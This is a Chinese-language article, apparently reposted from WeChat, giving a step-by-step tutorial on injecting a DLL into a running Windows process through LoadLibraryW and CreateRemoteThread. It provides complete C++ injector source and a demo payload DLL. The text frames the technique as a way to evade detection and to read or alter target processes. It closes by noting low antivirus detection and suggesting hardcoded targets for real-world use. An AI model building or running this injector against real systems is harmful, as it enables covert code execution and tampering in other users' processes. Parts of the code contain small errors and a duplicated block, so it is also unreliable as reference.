> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/HfaC5GlJqjY4TZWVk128pg)

进程注入是将任意代码写入已经运行的进程中并执行，可以用来逃避检测对目标目标进程中的敏感信息进行读 / 写 / 执行访问，还可以更改该进程的行为。

通过 LoadLibrary 注入 DLL
=====================

> .dll，动态链接库英文为 DLL，是 Dynamic Link Library 的缩写。DLL 是一个包含可由多个程序，同时使用的代码和数据的库。

Dll 不能直接运行，应用在从 DLL 调用函数的方法之一是通过运行时动态链接，即将 DLL 加载到程序的进程空间中以便可以调用其导出的函数时。

> https://docs.microsoft.com/en-us/windows/win32/dlls/run-time-dynamic-linking  
> 当应用程序调用 LoadLibrary 或 LoadLibraryEx 函数时，系统会尝试查找 DLL，如果搜索成功，则系统将 DLL 模块映射到进程的虚拟地址空间中，并增加引用计数。如果对 LoadLibrary 或 LoadLibraryEx 的调用指定了一个 DLL，其代码已映射到调用进程的虚拟地址空间中，则该函数将简单地返回该 DLL 的句柄并增加 DLL 的引用计数。请注意，具有相同基本文件名和扩展名但在不同目录中找到的两个 DLL 不被视为相同的 DLL。
> 
> 系统在名为 LoadLibrary 或 LoadLibraryEx 的线程的上下文中调用入口点函数。如果进程已经通过调用 LoadLibrary 或 LoadLibraryEx 调用了 DLL，而没有相应地调用 FreeLibrary 函数，则不调用入口点函数。
> 
> 如果系统找不到 DLL 或入口点函数返回 FALSE，则 LoadLibrary 或 LoadLibraryEx 返回 NULL。如果 LoadLibrary 或 LoadLibraryEx 成功，它将向 DLL 模块返回一个句柄。进程可以使用该句柄在对 GetProcAddress，FreeLibrary 或 FreeLibraryAndExitThread 函数的调用中识别 DLL
> 
> 该的 GetModuleHandle 函数返回使用的手柄 GetProcAddress 的，FreeLibrary 则或的 FreeLibraryAndExitThread。所述的 GetModuleHandle 仅当 DLL 模块被加载时联或由先前调用已经映射到进程的地址空间中函数成功的 LoadLibrary 或 LoadLibraryEx。与 LoadLibrary 或 LoadLibraryEx 不同，GetModuleHandle 不会增加模块引用计数。该 GetModuleFileName 函数检索模块通过返回的句柄相关联的完整路径的 GetModuleHandle，LoadLibrary 或 LoadLibraryEx。
> 
> 该过程可以使用 GetProcAddress 通过 LoadLibrary 或 LoadLibraryEx，GetModuleHandle 返回的 DLL 模块句柄获取 DLL 中导出函数的地址。
> 
> 当不再需要 DLL 模块时，该过程可以调用 FreeLibrary 或 FreeLibraryAndExitThread。如果引用计数为零，这些函数将减少模块引用计数，并从进程的虚拟地址空间取消 DLL 代码的映射。
> 
> 即使 DLL 不可用，运行时动态链接也可使进程继续运行。然后，该过程可以使用替代方法来实现其目标。例如，如果某个进程无法找到一个 DLL，则它可以尝试使用另一个 DLL，或者可以将错误通知用户。如果用户可以提供缺少的 DLL 的完整路径，则该进程可以使用此信息来加载 DLL，即使它不在常规搜索路径中也是如此。这种情况与加载时链接形成对比，在加载时链接中，如果找不到 DLL，系统将简单地终止进程。
> 
> 如果 DLL 使用 DllMain 函数对进程的每个线程执行初始化，则运行时动态链接可能会导致问题，因为对于调用 LoadLibrary 或 LoadLibraryEx 之前存在的线程，不会调用入口点。

那么 Dll 从一开始就可以映射到进程的内存中并执行，所以我们可以利用 Dll 把 shell 注入到进程中。

**创建有效载荷 DLL**
==============

在 Visual Studio 中创建新项目时，请在顶部栏中搜索 “dll”，然后选择基本的 DLL 项目模板。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCjBicUKPe4q4LOGSxrr7oVicrbPx4hedzTO8zaw37B9EKYodl7T1fXudOianEburxWeSianqE5v55bbw/640?wx_fmt=png)

为项目选择名称和文件路径后，将显示以下代码：

```
// dllmain.cpp : 定义 DLL 应用程序的入口点。
    #include "pch.h"
    
    BOOL APIENTRY DllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved
                         )
{
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
```

该项目模板包含 DLLMain 方法的框架，该框架是 DLL 的入口点。如 switch 语句所示，它在 4 种情况下被调用：

1.DLL_PROCESS_ATTACH

> 由于进程启动或对 LoadLibrary 的调用，DLL 正在被加载到当前进程的虚拟地址空间中。DLL 可以利用此机会初始化任何实例数据或使用 TlsAlloc 函数分配线程本地存储（TLS）索引。  
> 所述 lpReserved 参数指示是否 DLL 被静态或动态地装载。

2.DLL_PROCESS_DETACH

> 正在从调用进程的虚拟地址空间中卸载 DLL，因为它未成功加载或引用计数已达到零（进程每次调用 LoadLibrary 都终止或调用 FreeLibrary 一次）。所述 lpReserved 参数指示是否 DLL 正在卸载的结果 FreeLibrary 则呼叫，未能加载，或进程终止。DLL 可以利用此机会来调用 TlsFree 函数，以释放通过使用 TlsAlloc 分配的所有 TLS 索引，并释放任何线程本地数据。请注意，接收 DLL_PROCESS_DETACH 的线程  
> 通知不一定与接收 DLL_PROCESS_ATTACH 通知的线程相同

3.DLL_THREAD_ATTACH

> 当前进程正在创建一个新线程。发生这种情况时，系统将调用当前附加到该进程的所有 DLL 的入口点功能。该调用是在新线程的上下文中进行的。DLL 可以利用此机会为线程初始化 TLS 插槽。使用 DLL_PROCESS_ATTACH 调用 DLL 入口点函数的线程不会使用 DLL_THREAD_ATTACH 调用 DLL 入口点函数。  
> 请注意，只有在进程加载 DLL 之后创建的线程才使用此值调用 DLL 的入口点函数。使用 LoadLibrary 加载 DLL 时，现有线程不会调用新加载的 DLL 的入口点函数。

4.DLL_THREAD_DETACH

> 线程正在干净地退出。如果 DLL 已在 TLS 插槽中存储了指向已分配内存的指针，则它应利用此机会释放内存。系统使用此值调用所有当前加载的 DLL 的入口点函数。该调用是在退出线程的上下文中进行的。

更多可以查看

```
https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain
```

为了更好理解。我们可以依次使用上面的 4 种情况调用 MessageBox，然后观察。

```
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include <windows.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,// ul_reason_for_call的值
                       LPVOID lpReserved
                     )
{  //注：我们也可以在这里执行代码 
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        MessageBox(
            NULL,
            (LPCUWSTR)L"DLL_PROCESS_ATTACKH调用",
            (LPCUTSTR)L"In DllMain",
            MB_OK
        );
    case DLL_THREAD_ATTACH:
        MessageBox(
            NULL,
            (LPCUWSTR)L"DLL_RHREAD_ATTACH调用",
            (LPCUWSTR)L"In DllMain",
            MB_OK
        );

    case DLL_THREAD_DETACH:
        MessageBox(
            NULL,
            (LPCWSTR)L"DLL_THREAD_DETACH调用",
            (LPCWSTR)L"In DllMain",
            MB_OK
        );
    case DLL_PROCESS_DETACH:
        MessageBox(
            NULL,
            (LPCWSTR)L"DLL_PROCESS_DETACH调用",
            (LPCWSTR)L"In DllMain",
            MB_OK
        );
        break;
       
    }

    //注：我们也可以在这里执行代码 
    return TRUE;
}
```

构建项目（ctrl+b）后，我们可以使用 rundll32.exe 进行测试。但是需要调用一个导出的函数来运行我们的 DLL，但是由于上面的代码不会导出任何函数，因此我们构造一个伪函数 #1：

```
使用语法
C ++

HMODULE WINAPI LoadLibrary（
  _In_ LPCTSTR lpFileName
）;
https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCjBicUKPe4q4LOGSxrr7oVic3s4KdC9rMDcMoXlJBWGVPtGc5NT8QNLtNZZJ7FGIUFIWbSNsicr7EsA/640?wx_fmt=png)

构造注入程序
======

LoadLibrary 是 Windows API 中的一个函数，它可以将一个 DLL 加载到调用进程和调用的内存中 DLLMain（将指定的模块加载到调用进程的地址空间中）

```
processHandle = OpenProcess(PROCESS_ALL_ACCESS,
                                FALSE, 
                                PID); 

    if (processHandle == NULL) {
        printf("无法打开PID进程：%d", PID);
        return 0;
    }
```

LoadLibrary 使用 lpLibFileName 参数定义加载的 DLL 的路径，所以我们需要将有效负载 DLL 的绝对路径写入目标进程。在目标进程的地址空间中存在该字符串之后，使目标进程以 LoadLibrary 该字符串作为参数执行。

ok，我们打开 Visual studio

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCjBicUKPe4q4LOGSxrr7oVicyxTzic6MmDxKZG7MKmGsntfRO3cy0ldxHFF6PZEIKkzlthlKXSmtfoQ/640?wx_fmt=png)

我们使用 OpenProcess 函数用来打开一个已存在的进程对象，并获取进程的句柄。

```
TCHAR relativePath[BUFSIZE] = TEXT("");
    TCHAR absolutePath[BUFSIZE] = TEXT("");
    SIZE_T absolutePathSize = 0;
    std::cout << "\n句柄已打开，请输入要注入的DLL：:\n";
    std::wcin >> relativePath;

    // https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getfullpathnamew
    if (!GetFullPathNameW(relativePath,
         BUFSIZE, 
         absolutePath, 
         NULL)
        ) { 
        printf("找不到绝对路径 %s", relativePath);
        return 0;
    }
    else {
        absolutePathSize = sizeof(absolutePath);
        wprintf(L"绝对路径: %s, size: %d\n", absolutePath, absolutePathSize);
    
```

使用 GetFullPathNameW 获取我们定义的 DLL 路径

```
LPVOID bufferAddressInTargetProcess;
    printf("\n试图分配缓冲区的大小：%d  PID：%d...\n", absolutePathSize, PID);

    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
    bufferAddressInTargetProcess = VirtualAllocEx( processHandle,
                                                   NULL, 
                                                   absolutePathSize, 
                                                   MEM_COMMIT | MEM_RESERVE, 
                                                   PAGE_EXECUTE_READWRITE);

    if (!bufferAddressInTargetProcess) {
        printf("在PID中分配缓冲区失败 %d\n", PID);
        return 0;
    
```

但是我们需要考虑到某些字符串是宽字符串，而不是 ANSI。在宽字符串中，每个字符分配 2 个字节，而不是一个字节。请注意，absolutePath 由 GetFullPathNameW - 设置 W 的末尾意味着返回的路径将是一个宽字符串。在 TEXT（）中可以确保我们使用的是正确的编码。

然后使用 VirtualAllocEx 函数在指定进程中提交内存区域。

```
wprintf(L"在目标进程中的地址%#010x处分配缓冲区正在尝试向所分配的缓冲区写入绝对路径...", bufferAddressInTargetProcess);

    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    if (!WriteProcessMemory( processHandle,
                             bufferAddressInTargetProcess,
                             absolutePath,
                             absolutePathSize,
                             NULL )
        ) {
        printf("无法写入分配缓冲区的绝对路径 %d\n", bufferAddressInTargetProcess);
        return 0;
    }
```

使用 WriteProcessMemory 写入打开进程的内存区域。

```
LPVOID loadLibraryAddress;
// https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress
// https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea
loadLibraryAddress = (LPVOID)GetProcAddress( GetModuleHandle(TEXT("KERNEL32.DLL")), 
                                         "LoadLibraryW");
```

使用 GetModuleHandle 和 GetProcAddress 找到目标进程中需要调用的函数的地址。  
具体可以参考：  
http://www.rohitab.com/discuss/topic/43233-question-about-memory-loaded-module-addresses/

```
std::cout << "\nInjecting...\n";

HANDLE remoteThread;

// https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
remoteThread = CreateRemoteThread( processHandle,
                                   NULL,
                                   0,
                                   (LPTHREAD_START_ROUTINE)loadLibraryAddress,
                                   bufferAddressInTargetProcess,
                                   0,
                                   NULL
    );
WaitForSingleObject(remoteThread, INFINITE);

return 0;
```

使用 CreateRemoteThread 创建一个在其它进程地址空间中运行的线程 (也称: 创建远程线程)

```
// LoadLiBrary-inject-DLlC++.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

constexpr DWORD UUSIZE = 4096;

int main()
{
    DWORD PID;
    std::cout << "请输入你需要注入的PID \n";
    std::cin >> PID;
```

到这里基本上所有的代码都 ok 了

1.GetFullPathName 获取有效载荷 DLL 的绝对路径，该绝对路径将被写入目标进程。  
2.OpenProcess 打开目标进程的句柄。  
3.VirtualAllocEx 来分配你的目标进程中的缓冲，这将是其中的绝对路径写入到目标进程的内部。  
4.WriteProcessMemory，用于将有效负载的路径写入目标进程内部分配的缓冲区。  
5.GetModuleHandle 打开对 kernel32.dll（导出 LoadLibrary 的 DLL）的句柄。  
6. 一旦有了 kernel32.dll 的句柄，便可以通过 GetProcAddress 查找 LoadLibrary 的地址  
7.CreateRemoteThread 在目标进程中创建一个新线程，该线程将使用有效负载的路径作为参数来调用 LoadLibrary。

```
HANDLE processHandle;
    std::cout << "正在写入内存 \n";

    processHandle = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        PID);

    if (processHandle == NULL) {
        printf("未能为PID%d打开进程", "PID");
        return 0;
    }

    TCHAR relativePath[BUFSIZE] = TEXT("");
    TCHAR absolutePath[BUFSIZE] = TEXT("");
    SIZE_T absolutePathSize = 0;
    std::cout << "句柄已打开，请输入要注入的DLL:\n";
    std::wcin >> relativePath;
    if (!GetFullPathNameW(relativePath,
        BUFSIZE,
        absolutePath,
        NULL)
        ) {
        printf("未能找到 %s 的绝对路径", relativePath);
        return 0;
    }
    else {
        absolutePathSize = sizeof(absolutePath);
        wprintf(L"Absolute path: %s size:%d\n", absolutePath, absolutePathSize);
    }

    LPVOID bufferAddressInTargetProcess;
    printf("\n尝试在PID%d中分配大小为%d的缓冲区…\n", absolutePathSize, PID);
    bufferAddressInTargetProcess = VirtualAllocEx(
        processHandle,
        NULL,
        absolutePathSize + 200,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    wprintf(L"在目标进程中的地址 %#010x 处分配缓冲区..\n\n正在尝试向所分配的缓冲区写入绝对路径...", bufferAddressInTargetProcess);
    if (!WriteProcessMemory(processHandle,
        bufferAddressInTargetProcess,
        absolutePath,
        absolutePathSize,
        NULL)
        ) {
        printf("未能将绝对路径写入%d处分配的缓冲区 \n", bufferAddressInTargetProcess);
        return 0;
    }

    LPVOID loadLibraryAddress;
    loadLibraryAddress = (LPVOID)GetProcAddress(                                // https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress
        GetModuleHandle(TEXT("KERNEL32.DLL")), // https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea
        "LoadLibraryW"
    );

    std::cout << "\n 注入中...\n";

    HANDLE remoteThread;
    remoteThread = CreateRemoteThread(
        processHandle,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)loadLibraryAddress,
        bufferAddressInTargetProcess,
        0,
        NULL
    );
    WaitForSingleObject(remoteThread, INFINITE);

    return 0;

}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
```

```
HANDLE processHandle;
    std::cout << "正在写入内存 \n";
    processHandle = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        PID);
    if (processHandle == NULL) {
        printf("未能为PID%d打开进程", "PID");
        return 0;
    }
    TCHAR relativePath[BUFSIZE] = TEXT("");
    TCHAR absolutePath[BUFSIZE] = TEXT("");
    SIZE_T absolutePathSize = 0;
    std::cout << "句柄已打开，请输入要注入的DLL:\n";
    std::wcin >> relativePath;
    if (!GetFullPathNameW(relativePath,
        BUFSIZE,
        absolutePath,
        NULL)
        ) {
        printf("未能找到 %s 的绝对路径", relativePath);
        return 0;
    }
    else {
        absolutePathSize = sizeof(absolutePath);
        wprintf(L"Absolute path: %s size:%d\n", absolutePath, absolutePathSize);
    }
    LPVOID bufferAddressInTargetProcess;
    printf("\n尝试在PID%d中分配大小为%d的缓冲区…\n", absolutePathSize, PID);
    bufferAddressInTargetProcess = VirtualAllocEx(
        processHandle,
        NULL,
        absolutePathSize + 200,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    wprintf(L"在目标进程中的地址 %#010x 处分配缓冲区..\n\n正在尝试向所分配的缓冲区写入绝对路径...", bufferAddressInTargetProcess);
    if (!WriteProcessMemory(processHandle,
        bufferAddressInTargetProcess,
        absolutePath,
        absolutePathSize,
        NULL)
        ) {
        printf("未能将绝对路径写入%d处分配的缓冲区 \n", bufferAddressInTargetProcess);
        return 0;
    }
    LPVOID loadLibraryAddress;
    loadLibraryAddress = (LPVOID)GetProcAddress(                                // https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress
        GetModuleHandle(TEXT("KERNEL32.DLL")), // https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea
        "LoadLibraryW"
    );
    std::cout << "\n 注入中...\n";
    HANDLE remoteThread;
    remoteThread = CreateRemoteThread(
        processHandle,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)loadLibraryAddress,
        bufferAddressInTargetProcess,
        0,
        NULL
    );
    WaitForSingleObject(remoteThread, INFINITE);
    return 0;
}
// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单
// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
```

编译就可以使用了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCjBicUKPe4q4LOGSxrr7oVic9iauFgcNGf2eJBU2yr1oCLsgVIJciaBz7ic9ibV7zd0ZyfNalUOn2PVvtw/640?wx_fmt=png)

查杀不是很多，在实战中可以根据需要对 PID 和 DLL 路径进行硬编码，或者在调用时将它们作为参数输入命令行中。